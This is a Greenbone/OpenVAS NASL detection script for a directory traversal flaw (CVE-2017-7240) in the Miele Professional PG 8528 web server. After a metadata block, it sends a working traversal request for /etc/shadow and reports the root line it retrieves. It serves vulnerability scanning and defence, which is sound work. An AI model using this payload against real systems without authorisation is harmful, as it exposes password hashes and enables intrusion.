if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.108109" );
	script_version( "2021-09-09T08:01:35+0000" );
	script_cve_id( "CVE-2017-7240" );
	script_bugtraq_id( 97080 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-09-09 08:01:35 +0000 (Thu, 09 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-08-16 01:29:00 +0000 (Wed, 16 Aug 2017)" );
	script_tag( name: "creation_date", value: "2017-03-29 07:49:40 +0200 (Wed, 29 Mar 2017)" );
	script_name( "Miele Professional PG 8528 Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_mandatory_keys( "PST10/banner" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2017/Mar/63" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/41718/" );
	script_xref( name: "URL", value: "https://ics-cert.us-cert.gov/advisories/ICSA-17-138-01" );
	script_tag( name: "summary", value: "This host is running a Miele Professional PG 8528
  and is prone to a directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read local file or not." );
	script_tag( name: "impact", value: "Successful exploitation will allow
  remote attackers to read arbitrary files on the target system." );
	script_tag( name: "solution", value: "See the advisory for a solution." );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: PST10 WebServer" )){
	exit( 0 );
}
url = "/" + crap( data: "../", length: 3 * 12 ) + "etc/shadow";
if(shadow = http_vuln_check( port: port, url: url, pattern: "root:.*:0:" )){
	line = egrep( pattern: "root:.*:0:", string: shadow );
	line = chomp( line );
	report = "By requesting \"" + http_report_vuln_url( port: port, url: url, url_only: TRUE ) + "\" it was possible to retrieve the content\nof /etc/shadow.\n\n[...] " + line + " [...]\n";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

